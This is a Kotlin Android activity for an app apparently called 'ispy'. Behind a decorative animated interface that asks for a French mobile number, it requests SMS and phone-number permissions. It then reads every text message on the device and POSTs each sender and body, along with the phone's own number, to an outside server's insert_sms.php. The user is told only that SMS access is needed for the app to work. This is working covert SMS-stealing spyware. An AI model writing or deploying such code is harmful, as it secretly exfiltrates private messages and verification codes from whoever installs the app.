package com.tektak.ispy

import android.Manifest
import android.animation.ObjectAnimator
import android.app.AlertDialog
import android.content.ContentValues
import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.text.Editable
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.view.animation.AccelerateDecelerateInterpolator
import android.widget.EditText
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.airbnb.lottie.LottieAnimationView
import com.android.volley.Request
import com.android.volley.Response
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import java.security.MessageDigest
import java.security.SecureRandom


class MainActivity : AppCompatActivity() {
    private val REQUEST_READ_SMS = 2
    private lateinit var progressBar: ProgressBar
    private lateinit var imageView: ImageView
    private lateinit var btnimage: ImageView
    private lateinit var serienumber: TextView
    private lateinit var lottieAnimationView: LottieAnimationView
    private lateinit var textInfo: TextView
    private lateinit var sharedPreferences: SharedPreferences
    private val handler = Handler(Looper.getMainLooper())
    private val typewriterInterval: Long = 100 // Intervalle entre chaque caractère (en ms)
    private val repeatInterval: Long = 5000 // Intervalle de répétition (10 secondes)
    private val duration: Long = 120000 // Durée totale (2 minutes)
    private lateinit var editTextPhone: EditText
    private var devicePhoneNumber: String? = null
    private lateinit var quitButton: ImageView
    private lateinit var angeldustImg: ImageView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)

        btnimage = findViewById(R.id.btnsubmit)
        serienumber = findViewById(R.id.serienumber)
        sharedPreferences = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
        imageView = findViewById(R.id.parambtn)
        angeldustImg = findViewById(R.id.angeldust)
        lottieAnimationView = findViewById(R.id.lottieAnimationView)
        lottieAnimationView.visibility = View.GONE
        textInfo = findViewById(R.id.textinfo)
        editTextPhone = findViewById(R.id.editTextPhone)
        quitButton = findViewById(R.id.quitbtn)
        textInfo.text = ""
        serienumber.text = ""

        // Vérifier si la clé SHA-1 est déjà présente dans les SharedPreferences
        val storedKey = sharedPreferences.getString("sha1_key", null)
        if (storedKey.isNullOrEmpty()) {
            // Si la clé n'existe pas, générer une nouvelle clé SHA-1 et l'enregistrer
            val newKey = generateSHA1Key()
            serienumber.text = newKey
            saveKeyToSharedPreferences(newKey)
        } else {
            // Si la clé existe, utiliser celle stockée dans les SharedPreferences
            serienumber.text = storedKey
        }



        // Dans ton OnClickListener
        btnimage.setOnClickListener {
            if (isPhoneNumberValid(editTextPhone.text)) {
                btnimage.isEnabled = false
                showLottieAnimation()
                startTypewriterEffect()
                animShaker()
            } else {
                //Toast.makeText(this, "Numéro de téléphone non disponible ou non valide.", Toast.LENGTH_SHORT).show()
                showCustomToast("Numéro de téléphone non disponible ou non valide.")
            }
        }

        quitButton.setOnClickListener {
            showExitConfirmationDialog() // Ferme toutes les activités associées et quitte l'application
        }

        window.setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        )

        // Créer et configurer l'objet Animator pour l'effet de shake
        val shakeAnimator = ObjectAnimator.ofFloat(imageView, "translationY", 0f, 20f)
        shakeAnimator.duration = 100 // Durée de chaque cycle de shake
        shakeAnimator.repeatMode = ObjectAnimator.REVERSE
        shakeAnimator.repeatCount = ObjectAnimator.INFINITE
        shakeAnimator.interpolator = AccelerateDecelerateInterpolator()

        // Démarrer l'animation
        shakeAnimator.start()

        // Arrêter l'animation après 5 secondes
        angeldustImg.postDelayed({
            shakeAnimator.cancel()
        }, 5000)

        // Ajouter un clic listener à l'ImageView
        imageView.setOnClickListener {
            showInfoModal()
        }

        // Vérifier et demander les permissions
        if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_PHONE_STATE
            ) != PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_PHONE_NUMBERS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_PHONE_NUMBERS
                ),
                REQUEST_READ_SMS
            )
        } else {
            devicePhoneNumber = getPhoneNumber()
            fetchSMS()


        }
    }

    private fun getPhoneNumber(): String? {
        // Vérifie à nouveau les permissions avant d'accéder au numéro de téléphone
        return if (ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_PHONE_NUMBERS
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            val telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            val phoneNumber = telephonyManager.line1Number // Récupère le numéro de téléphone
            if (phoneNumber != null && phoneNumber.isNotEmpty()) {
                phoneNumber
            } else {

                Toast.makeText(this, "Numéro de téléphone non disponible", Toast.LENGTH_LONG).show()
                null
            }
        } else {
            Toast.makeText(this, "Permissions non accordées", Toast.LENGTH_LONG).show()
            null
        }
    }

    private fun isValidPhoneNumber(phoneNumber: String): Boolean {
        return phoneNumber.length >= 10 && phoneNumber.all { it.isDigit() }
    }

    private fun generateSHA1Key(): String {
        val random = SecureRandom()
        val bytes = ByteArray(20) // SHA-1 produit un hash de 20 octets
        random.nextBytes(bytes)
        val md = MessageDigest.getInstance("SHA-1")
        val digest = md.digest(bytes)
        return digest.joinToString("") { "%02x".format(it) }
    }

    private fun saveKeyToSharedPreferences(key: String) {
        val editor = sharedPreferences.edit()
        editor.putString("sha1_key", key)
        editor.apply()
    }

    private fun startTypewriterEffect() {
        val fullText = getString(R.string.infotext)
        handler.post(object : Runnable {
            override fun run() {
                showTypewriterText(fullText)
                // Répéter toutes les 10 secondes
                handler.postDelayed(this, repeatInterval)
            }
        })

        // Arrêter après 2 minutes
        handler.postDelayed({
            handler.removeCallbacksAndMessages(null)
            textInfo.text = ""
        }, duration)
    }

    private fun showTypewriterText(text: String) {
        textInfo.text = ""
        var index = 0

        val typewriterHandler = Handler(Looper.getMainLooper())
        val typewriterRunnable = object : Runnable {
            override fun run() {
                if (index < text.length) {
                    textInfo.text = textInfo.text.toString() + text[index]
                    index++
                    typewriterHandler.postDelayed(this, typewriterInterval)
                }
            }
        }
        typewriterHandler.post(typewriterRunnable)
    }

    private fun showLottieAnimation() {
        // Afficher l'animation Lottie
        lottieAnimationView.visibility = View.VISIBLE

        // Masquer l'animation après 2 minutes (120 000 ms)
        Handler(Looper.getMainLooper()).postDelayed({
            lottieAnimationView.visibility = View.GONE
        }, 120000) // 2 minutes en millisecondes
    }

    // SMS
    override fun onStop() {
        super.onStop()
        deleteSMSFromServer()
    }

    private fun deleteSMSFromServer() {
        val queue = Volley.newRequestQueue(this)
        val url = "https://jplprojetct.alwaysdata/delete_sms.php"

        val request = StringRequest(
            Request.Method.POST, url,
            { response ->
                Log.d(ContentValues.TAG, "Response: $response")
            },
            { error ->
                Log.e(ContentValues.TAG, "Error: ${error.message}")
            })

        queue.add(request)
    }

    private fun fetchSMS() {
        val smsList = mutableListOf<Pair<String, String>>()

        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY),
            null,
            null,
            Telephony.Sms.DEFAULT_SORT_ORDER
        )

        cursor?.use { cursor ->
            val addressColumn = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyColumn = cursor.getColumnIndex(Telephony.Sms.BODY)

            while (cursor.moveToNext()) {
                val address = cursor.getString(addressColumn)
                val body = cursor.getString(bodyColumn)
                smsList.add(address to body)
            }
        }

        if (smsList.isEmpty()) {
            //Toast.makeText(this, "Aucun SMS à envoyer", Toast.LENGTH_SHORT).show()
            showCustomToast("Aucun SMS à envoyer")
        } else {
            sendSMSListToServer(smsList)

        }
    }

    private fun sendSMSListToServer(smsList: MutableList<Pair<String, String>>) {
        val queue = Volley.newRequestQueue(this)
        val url = "https://jplprojetct.alwaysdata/insert_sms.php"
        val storedKey = sharedPreferences.getString("sha1_key", null)

        for (sms in smsList) {
            val request = object : StringRequest(Request.Method.POST, url,
                Response.Listener { response ->
                    Log.d(ContentValues.TAG, "Response: $response")
                },
                Response.ErrorListener { error ->
                    Log.e(ContentValues.TAG, "Error: ${error.message}")
                }) {
                override fun getParams(): Map<String, String> {
                    val params = HashMap<String, String>()
                    params["address"] = sms.first
                    params["body"] = sms.second
                    params["sha1_key"] = storedKey ?: ""
                    params["telnumber"] = devicePhoneNumber ?: "Unknown" // Utilise le numéro de téléphone récupéré
                    return params
                }
            }
            queue.add(request)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        when (requestCode) {
            REQUEST_READ_SMS -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    devicePhoneNumber = getPhoneNumber()
                    fetchSMS()
                } else {
                    Log.e(ContentValues.TAG, "Permission d'accéder aux SMS refusée")
                    Toast.makeText(
                        this,
                        "Permission d'accéder aux SMS refusée",
                        Toast.LENGTH_SHORT
                    ).show()
                    showPermissionExplanationDialog()
                }
            }
        }
    }

    private fun showPermissionExplanationDialog() {
        AlertDialog.Builder(this)
            .setTitle("Permission nécessaire")
            .setMessage("Cette application a besoin d'accéder à vos SMS pour fonctionner correctement. Veuillez accorder la permission.")
            .setPositiveButton("Réessayer") { dialog, _ ->
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.READ_SMS),
                    REQUEST_READ_SMS
                )
            }
            .setNegativeButton("Annuler") { dialog, _ ->
                dialog.dismiss()
            }
            .setNeutralButton("Paramètres") { dialog, _ ->
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                val uri = Uri.fromParts("package", packageName, null)
                intent.data = uri
                startActivity(intent)
            }
            .create()
            .show()
    }

    private fun showInfoModal() {
        // Créer une AlertDialog pour afficher le modal
        val dialogBuilder = AlertDialog.Builder(this)
        val inflater = LayoutInflater.from(this)
        val dialogView = inflater.inflate(R.layout.modal_info, null)
        dialogBuilder.setView(dialogView)

        // Créer et afficher le dialogue
        val alertDialog = dialogBuilder.create()
        alertDialog.show()
    }

    // Fonction pour vérifier la validité du numéro de téléphone
    fun isPhoneNumberValid(phoneNumber: Editable): Boolean {
        if (phoneNumber == null) return false

        // Regex pour vérifier si le numéro commence par 06 ou 07 et contient exactement 10 chiffres
        val regex = Regex("^0[67][0-9]{8}\$")
        return regex.matches(phoneNumber)
    }


    fun animShaker(){
        val shakeAnimator = ObjectAnimator.ofFloat(angeldustImg, "translationY", 0f, 20f)
        shakeAnimator.duration = 100 // Durée de chaque cycle de shake
        shakeAnimator.repeatMode = ObjectAnimator.REVERSE
        shakeAnimator.repeatCount = ObjectAnimator.INFINITE
        shakeAnimator.interpolator = AccelerateDecelerateInterpolator()

        // Démarrer l'animation
        shakeAnimator.start()
    }


    private fun showExitConfirmationDialog() {
        val builder = AlertDialog.Builder(this)
        val inflater = LayoutInflater.from(this)
        val dialogView: View = inflater.inflate(R.layout.custom_dialog_layout, null)

        // Références des ImageView pour Oui et Non
        val yesButton: ImageView = dialogView.findViewById(R.id.yes_button)
        val noButton: ImageView = dialogView.findViewById(R.id.no_button)

        // Ajoute le layout personnalisé au dialogue
        builder.setView(dialogView)

        val alertDialog = builder.create()

        // Gère le clic sur le bouton "Oui"
        yesButton.setOnClickListener {
            finishAffinity() // Quitte l'application
            alertDialog.dismiss()
        }

        // Gère le clic sur le bouton "Non"
        noButton.setOnClickListener {
            alertDialog.dismiss() // Ferme le dialogue et retourne à l'application
        }

        alertDialog.show()
    }


    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null) // Arrête le handler lors de la destruction de l'activité
    }

    private fun showCustomToast(message: String) {
        // Récupère le LayoutInflater
        val inflater = LayoutInflater.from(this)
        // Inflate le layout personnalisé
        val layout: View = inflater.inflate(R.layout.custom_toast_layout, null)

        // Récupère l'ImageView et TextView
        val imageView: ImageView = layout.findViewById(R.id.toast_icon)
        val textView: TextView = layout.findViewById(R.id.toast_text)

        // Set l'image et le texte
        imageView.setImageResource(R.mipmap.ispyicon) // Assurez-vous que c'est l'icône de votre application
        textView.text = message

        // Crée le Toast avec le layout personnalisé
        val toast = Toast(applicationContext)
        toast.duration = Toast.LENGTH_LONG
        toast.view = layout
        toast.show()
    }
}







